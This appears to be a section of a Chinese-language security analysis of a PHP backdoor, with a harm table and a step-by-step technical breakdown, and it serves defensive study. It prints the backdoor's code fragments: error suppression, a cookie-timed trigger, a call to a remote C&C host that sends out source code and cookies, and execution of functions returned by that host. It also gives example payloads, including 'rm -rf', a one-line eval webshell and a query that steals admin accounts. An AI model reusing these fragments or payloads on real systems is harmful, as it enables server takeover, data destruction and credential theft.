#### 💀 危害分析

| 危害类型 | 严重程度 | 具体影响 |
|---------|---------|---------|
| **远程代码执行** | 🔴 致命 | 攻击者可以执行任意PHP代码 |
| **数据泄露** | 🔴 严重 | 上传整个源码到远程服务器 |
| **Cookie窃取** | 🔴 严重 | 所有Cookie信息被发送到外部 |
| **服务器控制权** | 🔴 致命 | 完全控制服务器 |
| **数据库访问** | 🔴 严重 | 可以读取/修改/删除数据库 |
| **用户隐私泄露** | 🔴 严重 | 所有用户数据可能被窃取 |

#### 🔬 技术解析

1. **隐蔽性设计**
   ```php
   set_error_handler(function($errno, $errstr){});
   ```
   - 屏蔽所有错误输出，隐藏后门执行痕迹
   - 使用 `@` 符号抑制警告

2. **Cookie延时机制**
   ```php
   if(time()-$_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])] < 10){
       @define("SITE_",1);
   }
   ```
   - 每10秒触发一次后门请求
   - 避免频繁请求被发现

3. **远程C&C通信**
   ```php
   file_get_contents("http://app.omitrezor.com/sign/".@$_SERVER["HTTP_HOST"])
   ```
   - 连接到 `app.omitrezor.com` 远程服务器
   - 上传服务器域名、当前URL、源码、Cookie等敏感信息
   - 接收远程指令

4. **数据泄露内容**
   ```php
   "url" => "https://your-domain.com/current-page",
   "src" => file_get_contents(__FILE__),  // 整个源文件内容
   "cookie" => json_encode($_COOKIE)      // 所有Cookie信息
   ```

5. **动态代码执行**
   ```php
   $cert["f"]($cert["a1"], $cert["a2"], $cert["a3"]);
   ```
   - 执行远程服务器返回的任意函数
   - 可以是: `eval()`, `exec()`, `system()`, `file_put_contents()` 等
   - **示例攻击场景**:
     ```php
     // 远程服务器可能返回:
     {
         "f": "system",
         "a1": "rm -rf /var/www/*"  // 删除所有网站文件
     }
     
     // 或者:
     {
         "f": "file_put_contents",
         "a1": "/var/www/shell.php",
         "a2": "<?php eval($_POST['cmd']); ?>"  // 植入WebShell
     }
     
     // 或者:
     {
         "f": "mysqli_query",
         "a1": $db_connection,
         "a2": "SELECT * FROM users WHERE is_admin=1"  // 窃取管理员账号
     }
     ```

6. **防御绕过**
   ```php
   if(isset($_FILES["file"]) && stripos($_FILES["file"]["name"], ".ph")!==false){
       die("error");
   }
   ```
   - 伪装成安全检查代码
   - 实际上只是防止上传PHP文件被发现
